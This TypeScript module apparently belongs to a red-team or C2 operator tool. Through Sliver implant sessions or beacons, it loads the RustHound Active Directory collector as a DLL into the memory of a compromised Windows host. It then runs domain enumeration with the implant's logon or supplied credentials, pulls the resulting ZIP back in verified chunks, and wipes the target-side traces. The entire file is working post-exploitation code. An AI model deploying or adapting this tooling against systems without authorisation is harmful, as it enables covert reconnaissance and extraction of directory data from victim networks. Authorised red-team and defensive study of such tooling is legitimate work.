import { createHash, randomUUID } from "node:crypto";
import { join } from "node:path";
import { setTimeout as timerDelay } from "node:timers/promises";

import { sliverpb, type clientpb } from "sliver-script";
import { parseAdDomain, type RUSTHOUND_COLLECTION_METHODS } from "../shared/ad-explorer-contracts.js";
import type { TargetSummary } from "../shared/target-contracts.js";
import { isCompleteZipEnvelope } from "./ad-collector.js";
import { isWindowsAmd64 } from "./rusthound-armory.js";
import { collectedRustHoundDomain } from "./rusthound-domain.js";
import { writePrivateFileExclusiveAtomic } from "./secure-file.js";
import type { SliverClientAdapter } from "./sliver-client-adapter.js";

export const RUSTHOUND_COLLECTION_MAX_BYTES = 64 * 1024 * 1024;
const CHUNK_BYTES = 32 * 1024;
const POLL_MS = 15_000;
const EXECUTION_DEADLINE_MS = 45 * 60_000;
const TRANSFER_DEADLINE_MS = 3 * 60 * 60_000;
const TASK_TIMEOUT_SECONDS = 120;
const RESPONSE_MAX_BYTES = 64 * 1024;

export type RustHoundMethod = (typeof RUSTHOUND_COLLECTION_METHODS)[number];
export type RustHoundClient = Pick<SliverClientAdapter,
  "registerAdCollectorSession" | "registerAdCollectorBeacon" | "callAdCollectorSession" |
  "callAdCollectorBeacon" | "fetchAdCollectorBeaconTask" | "cancelBeaconTask">;

export interface RustHoundProgress {
  phase: "registering" | "collecting" | "transferring" | "saving";
  transferredBytes: number;
  totalBytes?: number;
}

export interface CollectRustHoundInput {
  client: RustHoundClient;
  target: TargetSummary;
  dll: Buffer;
  domain?: string;
  ldapFqdn?: string;
  ldaps?: boolean;
  method: RustHoundMethod;
  /** Omitted to use the target process's Windows logon. */
  credentials?: { username: string; password: string };
  collectionRoot: string;
  assertCurrent: () => void;
  signal?: AbortSignal;
  onProgress?: (progress: RustHoundProgress) => void;
  now?: () => number;
  delay?: (milliseconds: number) => Promise<void>;
}

type ProtocolResponse = Record<string, unknown> & { version: 1; state: string };

function cancelled(): Error {
  const error = new Error("AD collection was cancelled.");
  error.name = "AbortError";
  return error;
}

function assertActive(input: CollectRustHoundInput, ignoreCancellation = false): void {
  input.assertCurrent();
  if (!ignoreCancellation && input.signal?.aborted) throw cancelled();
}

async function pause(input: CollectRustHoundInput, milliseconds: number, delay: (milliseconds: number) => Promise<void>, ignoreCancellation = false): Promise<void> {
  assertActive(input, ignoreCancellation);
  if (!input.signal || ignoreCancellation) { await delay(milliseconds); return; }
  const signal = input.signal;
  if (!input.delay) {
    try { await timerDelay(milliseconds, undefined, { signal }); }
    catch (error) { if (signal.aborted) throw cancelled(); throw error; }
    assertActive(input);
    return;
  }
  let listener: (() => void) | undefined;
  try {
    await Promise.race([
      delay(milliseconds),
      new Promise<never>((_resolve, reject) => {
        listener = () => reject(cancelled());
        signal.addEventListener("abort", listener, { once: true });
        if (signal.aborted) listener();
      }),
    ]);
  } finally { if (listener) signal.removeEventListener("abort", listener); }
  assertActive(input);
}

/** Never echo target-controlled strings: an LDAP error can contain explicit credentials. */
export function rustHoundFailure(value: unknown): Error {
  const message = typeof value === "string" ? value.slice(0, 4096) : "";
  if (/no credentials are available|SEC_E_NO_CREDENTIALS|0x8009030e/iu.test(message)) {
    return new Error("The target's Windows logon has no usable domain credentials. Use a session or beacon started with a full domain logon, or choose AD credentials. A domain user name alone does not establish Kerberos authentication.");
  }
  if (/DsGetDcName|domain discovery|domain controller.*(?:not found|unavailable)|1355/iu.test(message)) {
    return new Error("RustHound could not discover the AD domain or its domain controller. Check the target's domain membership and DNS, or enter the AD DNS domain and a domain controller FQDN.");
  }
  if (/GSSAPI|Kerberos|SSPI|security context|InitializeSecurityContext/iu.test(message)) {
    return new Error("Windows domain authentication failed. Check the target's domain logon, domain controller FQDN, DNS, and clock synchronization, or choose AD credentials.");
  }
  if (/invalid credentials|authentication.*failed|ldap.*(?:49|bind)|simple.*bind/iu.test(message)) {
    return new Error("AD authentication was rejected. Check the account, password, and domain; confirm the selected authentication method is allowed by the domain controller.");
  }
  if (/timed? out|timeout|deadline/iu.test(message)) {
    return new Error("RustHound timed out. Check connectivity to the domain controller and try LDAP only to narrow the collection.");
  }
  if (/connect|DNS|resolve|network|unreachable|refused/iu.test(message)) {
    return new Error("RustHound could not reach the directory service. Check target DNS, the domain controller FQDN, LDAP transport, and network connectivity.");
  }
  if (/collection.*already|already.*(?:running|collection)|previous.*collection/iu.test(message)) {
    return new Error("RustHound already has a collection on this target. Let that collection finish or cancel it before starting another.");
  }
  return new Error("RustHound collection failed on the target. Check the target's domain logon and domain controller connectivity, then retry with LDAP only.");
}

function protocolResponse(output: Buffer): ProtocolResponse {
  if (!output.length || output.length > RESPONSE_MAX_BYTES) throw new Error("RustHound returned an invalid response size");
  let value: unknown;
  try { value = JSON.parse(new TextDecoder("utf-8", { fatal: true }).decode(output)) as unknown; }
  catch { throw new Error("RustHound returned an invalid response frame"); }
  if (!value || typeof value !== "object" || Array.isArray(value) ||
      (value as Record<string, unknown>)["version"] !== 1 ||
      typeof (value as Record<string, unknown>)["state"] !== "string") {
    throw new Error("RustHound returned an unsupported response frame");
  }
  return value as ProtocolResponse;
}

function runId(response: ProtocolResponse): string {
  const value = response["runId"];
  if (typeof value !== "string" || !/^[a-f0-9]{1,16}$/u.test(value)) {
    throw new Error("RustHound returned an invalid collection ID");
  }
  return value;
}

function taskId(response: { Async: boolean; TaskID: string; BeaconID: string } | undefined, beaconId: string): string {
  if (!response?.Async || response.BeaconID !== beaconId ||
      !/^[A-Za-z0-9_-]{1,128}$/u.test(response.TaskID)) {
    throw new Error("The beacon did not return a correlated RustHound task");
  }
  return response.TaskID;
}

function completedBeaconTask(task: clientpb.BeaconTask): boolean {
  const state = task.State.trim().toLowerCase();
  if (state === "completed") return true;
  if (state === "failed" || state === "cancelled" || state === "canceled") {
    throw new Error("The RustHound beacon task failed");
  }
  if (state !== "pending" && state !== "sent") throw new Error("Unknown RustHound beacon task state");
  return false;
}

async function waitBeaconTask(
  input: CollectRustHoundInput, id: string, kind: "register" | "call", extensionName: string, deadline: number,
  now: () => number, delay: (milliseconds: number) => Promise<void>,
  cancellation: "throw" | "recover-start" | "ignore" = "throw",
): Promise<Buffer> {
  let cancellationRequested = false;
  while (now() < deadline) {
    input.assertCurrent();
    if (input.signal?.aborted && cancellation === "ignore" && !cancellationRequested) {
      cancellationRequested = true;
      deadline = Math.min(deadline, now() + TASK_TIMEOUT_SECONDS * 1000);
    }
    if (input.signal?.aborted && cancellation !== "ignore" && !cancellationRequested) {
      cancellationRequested = true;
      // Cancel only the correlated task, never all tasks on this beacon. Once
      // Start has been sent, recover its run ID before aborting target memory.
      let stopped = false;
      try {
        const task = await input.client.cancelBeaconTask(id, 30);
        try {
          input.assertCurrent();
          stopped = task.ID === id && task.BeaconID === input.target.id && /^(?:cancelled|canceled)$/iu.test(task.State);
        } finally { task.Request.fill(0); task.Response.fill(0); }
      } catch { /* A sent task can no longer be cancelled on the server. */ }
      // A cancellation RPC may race a workspace reconnect. Binding failures
      // must not be mistaken for a sent task or allow another request afterward.
      input.assertCurrent();
      if (stopped || cancellation !== "recover-start") throw cancelled();
      deadline = Math.min(deadline, now() + TASK_TIMEOUT_SECONDS * 1000);
    }
    const task = await input.client.fetchAdCollectorBeaconTask(input.target.id, id, kind, extensionName, 30);
    try {
      input.assertCurrent();
      if (completedBeaconTask(task)) {
        if (!task.Response.length) throw new Error("The RustHound beacon task returned no response");
        return Buffer.from(task.Response);
      }
    } finally { task.Request.fill(0); task.Response.fill(0); }
    try {
      await pause(input, Math.min(POLL_MS, Math.max(0, deadline - now())), delay,
        cancellation === "ignore" || cancellationRequested);
    } catch (error) {
      // Return to the loop once to cancel the pending correlated beacon task.
      if (!input.signal?.aborted || cancellation === "ignore") throw error;
    }
  }
  if (cancellationRequested) throw new Error("Cancellation was requested, but the beacon has not acknowledged it. Reconnect to the target before starting another collection.");
  throw new Error("The RustHound beacon task did not complete before its deadline");
}

async function register(
  input: CollectRustHoundInput, now: () => number, delay: (milliseconds: number) => Promise<void>,
): Promise<string> {
  assertActive(input);
  const name = createHash("sha256").update(input.dll).digest("hex");
  const response = input.target.mode === "session"
    ? await input.client.registerAdCollectorSession(input.target.id, input.dll, TASK_TIMEOUT_SECONDS)
    : await input.client.registerAdCollectorBeacon(input.target.id, input.dll, TASK_TIMEOUT_SECONDS);
  if (response.Response?.Err?.trim()) throw new Error("The target rejected the RustHound extension");
  if (input.target.mode === "beacon") {
    const id = taskId(response.Response, input.target.id);
    const bytes = await waitBeaconTask(input, id, "register", name, now() + EXECUTION_DEADLINE_MS, now, delay);
    try {
      const completed = sliverpb.RegisterExtension.decode(bytes);
      if (completed.Response?.Err?.trim()) throw new Error("The beacon could not load RustHound in memory");
    } finally { bytes.fill(0); }
  }
  assertActive(input);
  return name;
}

async function call(
  input: CollectRustHoundInput, extensionName: string, request: Record<string, unknown>,
  deadline: number, now: () => number, delay: (milliseconds: number) => Promise<void>,
  ignoreCancellation = false,
): Promise<ProtocolResponse> {
  assertActive(input, ignoreCancellation);
  const args = Buffer.from(JSON.stringify({ version: 1, ...request }), "utf8");
  let response: sliverpb.CallExtension;
  try {
    response = input.target.mode === "session"
      ? await input.client.callAdCollectorSession(input.target.id, extensionName, args, TASK_TIMEOUT_SECONDS)
      : await input.client.callAdCollectorBeacon(input.target.id, extensionName, args, TASK_TIMEOUT_SECONDS);
  } finally { args.fill(0); }
  if (response.Response?.Err?.trim()) {
    response.Output.fill(0);
    throw new Error("The target rejected a RustHound command");
  }
  if (input.target.mode === "beacon") {
    response.Output.fill(0);
    const id = taskId(response.Response, input.target.id);
    const bytes = await waitBeaconTask(input, id, "call", extensionName, deadline, now, delay,
      ignoreCancellation ? "ignore" : request["op"] === "start" ? "recover-start" : "throw");
    try {
      response = sliverpb.CallExtension.decode(bytes);
    } finally { bytes.fill(0); }
  }
  try {
    // Start must return its run ID even when cancellation occurred in-flight.
    // The caller then aborts exactly that run in its finally block.
    assertActive(input, ignoreCancellation || request["op"] === "start" || request["op"] === "finish");
    if (response.Response?.Err?.trim()) throw new Error("The RustHound extension returned an execution error");
    return protocolResponse(response.Output);
  } finally { response.Output.fill(0); }
}

function completeStatus(response: ProtocolResponse, expectedId: string): { size: number; sha256: string } | null {
  if (runId(response) !== expectedId) throw new Error("RustHound changed the collection ID");
  if (response.state === "running") return null;
  if (response.state !== "complete") throw rustHoundFailure(response["error"]);
  const size = response["size"];
  const sha256 = response["sha256"];
  if (typeof size !== "number" || !Number.isSafeInteger(size) || size < 1 || size > RUSTHOUND_COLLECTION_MAX_BYTES ||
      typeof sha256 !== "string" || !/^[a-f0-9]{64}$/u.test(sha256)) {
    throw new Error("RustHound returned invalid collection metadata");
  }
  return { size, sha256 };
}

function readChunk(response: ProtocolResponse, expectedId: string, expectedOffset: number, size: number): Buffer {
  if (response.state === "error") throw rustHoundFailure(response["error"]);
  if (response.state !== "chunk" || runId(response) !== expectedId || response["offset"] !== expectedOffset ||
      typeof response["nextOffset"] !== "number" || !Number.isSafeInteger(response["nextOffset"]) ||
      response["nextOffset"] <= expectedOffset || response["nextOffset"] > size ||
      typeof response["data"] !== "string" || response["data"].length > Math.ceil(CHUNK_BYTES / 3) * 4 + 4 ||
      !/^(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?$/u.test(response["data"])) {
    throw new Error("RustHound returned an invalid collection chunk");
  }
  const chunk = Buffer.from(response["data"], "base64");
  if (!chunk.length || chunk.length > CHUNK_BYTES || expectedOffset + chunk.length !== response["nextOffset"]) {
    chunk.fill(0);
    throw new Error("RustHound returned a mismatched collection chunk");
  }
  return chunk;
}

function releasedRun(response: ProtocolResponse): boolean {
  return response.state === "error" && response["runId"] === undefined && response["error"] === "runId was not found";
}

async function abortAndRelease(input: CollectRustHoundInput, extensionName: string, id: string,
  now: () => number, delay: (milliseconds: number) => Promise<void>): Promise<void> {
  const deadline = now() + TASK_TIMEOUT_SECONDS * 1000;
  const aborted = await call(input, extensionName, { op: "abort", runId: id }, deadline, now, delay, true);
  if (releasedRun(aborted)) return;
  if (aborted.state !== "aborted" || runId(aborted) !== id) throw new Error("RustHound did not acknowledge collection cancellation");
  // Native abort acknowledges the flag before its worker and in-memory ZIP are
  // released. Do not report a completed cancellation or admit the next run until
  // this exact run is absent (or its terminal record has been finished).
  while (now() < deadline) {
    const status = await call(input, extensionName, { op: "status", runId: id }, deadline, now, delay, true);
    if (releasedRun(status)) return;
    if (runId(status) !== id) throw new Error("RustHound changed the collection ID during cancellation");
    if (status.state !== "running") {
      const finished = await call(input, extensionName, { op: "finish", runId: id }, deadline, now, delay, true);
      if (releasedRun(finished) || finished.state === "finished" && runId(finished) === id) return;
      throw new Error("RustHound did not release the cancelled collection");
    }
    await pause(input, Math.min(500, Math.max(0, deadline - now())), delay, true);
  }
  throw new Error("RustHound has not finished releasing the cancelled collection");
}

/** Runs a signed Armory DLL entirely from implant memory and saves only a verified client-side ZIP. */
export async function collectRustHound(input: CollectRustHoundInput): Promise<{ path: string; domain: string }> {
  const now = input.now ?? Date.now;
  const delay = input.delay ?? ((milliseconds: number) => new Promise<void>((resolve) => setTimeout(resolve, milliseconds)));
  const requestedDomain = input.domain === undefined ? undefined : parseAdDomain(input.domain);
  if (!isWindowsAmd64(input.target)) {
    throw new Error("RustHound requires a Windows x64 target");
  }
  if (input.target.mode === "session" && input.target.liveness !== "active") {
    throw new Error("The selected Windows session is no longer active");
  }
  if (input.credentials && (!input.credentials.username || !input.credentials.password)) {
    throw new Error("RustHound requires both a user name and password for explicit authentication");
  }
  if (input.credentials && !requestedDomain) throw new Error("Enter an AD DNS domain when using explicit credentials.");
  assertActive(input);
  let zip: Buffer | undefined;
  let id: string | undefined;
  let finished = false;
  input.onProgress?.({ phase: "registering", transferredBytes: 0 });
  const extensionName = await register(input, now, delay);
  const deadline = now() + EXECUTION_DEADLINE_MS;
  try {
    const started = await call(input, extensionName, {
      op: "start", ...(requestedDomain ? { domain: requestedDomain } : {}), method: input.method,
      ...(input.ldapFqdn ? { ldapFqdn: input.ldapFqdn } : {}), ...(input.ldaps ? { ldaps: true } : {}),
      ...(input.credentials ? { username: input.credentials.username, password: input.credentials.password } : { currentUser: true }),
      maxBytes: RUSTHOUND_COLLECTION_MAX_BYTES,
      timeoutSeconds: Math.floor(EXECUTION_DEADLINE_MS / 1000),
    }, deadline, now, delay);
    if (started.state !== "running") throw rustHoundFailure(started["error"]);
    id = runId(started);
    assertActive(input);
    input.onProgress?.({ phase: "collecting", transferredBytes: 0 });
    let metadata: { size: number; sha256: string } | null = null;
    while (now() < deadline && !metadata) {
      assertActive(input);
      const status = await call(input, extensionName, { op: "status", runId: id }, deadline, now, delay);
      metadata = completeStatus(status, id);
      if (!metadata) await pause(input, Math.min(POLL_MS, Math.max(0, deadline - now())), delay);
    }
    if (!metadata) throw new Error("RustHound collection timed out");
    zip = Buffer.alloc(metadata.size);
    let offset = 0;
    input.onProgress?.({ phase: "transferring", transferredBytes: 0, totalBytes: metadata.size });
    const transferDeadline = now() + TRANSFER_DEADLINE_MS;
    while (offset < metadata.size) {
      if (now() >= transferDeadline) throw new Error("RustHound transfer timed out");
      assertActive(input);
      const response = await call(input, extensionName, {
        op: "read", runId: id, offset, maxBytes: Math.min(CHUNK_BYTES, metadata.size - offset),
      }, transferDeadline, now, delay);
      const chunk = readChunk(response, id, offset, metadata.size);
      try { chunk.copy(zip, offset); offset += chunk.length; }
      finally { chunk.fill(0); }
      input.onProgress?.({ phase: "transferring", transferredBytes: offset, totalBytes: metadata.size });
    }
    if (createHash("sha256").update(zip).digest("hex") !== metadata.sha256 || !isCompleteZipEnvelope(zip)) {
      throw new Error("RustHound did not return a complete, verified ZIP archive");
    }
    const domain = collectedRustHoundDomain(zip, requestedDomain);
    assertActive(input);
    const finishedResponse = await call(input, extensionName, { op: "finish", runId: id }, transferDeadline, now, delay, true);
    if (finishedResponse.state !== "finished" || runId(finishedResponse) !== id) {
      throw new Error("RustHound did not release its collection from target memory");
    }
    finished = true;
    assertActive(input);
    input.onProgress?.({ phase: "saving", transferredBytes: metadata.size, totalBytes: metadata.size });
    const path = join(input.collectionRoot, domain, `rusthound-${randomUUID()}.zip`);
    await writePrivateFileExclusiveAtomic(path, zip, () => assertActive(input));
    return { path, domain };
  } finally {
    let cleanupFailed = false;
    if (id && !finished) {
      // Cleanup retains binding checks but must not inherit the aborted signal.
      try {
        await abortAndRelease(input, extensionName, id, now, delay);
      } catch { cleanupFailed = true; }
    }
    zip?.fill(0);
    if (cleanupFailed && input.signal?.aborted) {
      throw new Error("Cancellation was requested, but the target did not acknowledge collection cleanup. Reconnect to the target before starting another collection.");
    }
  }
}
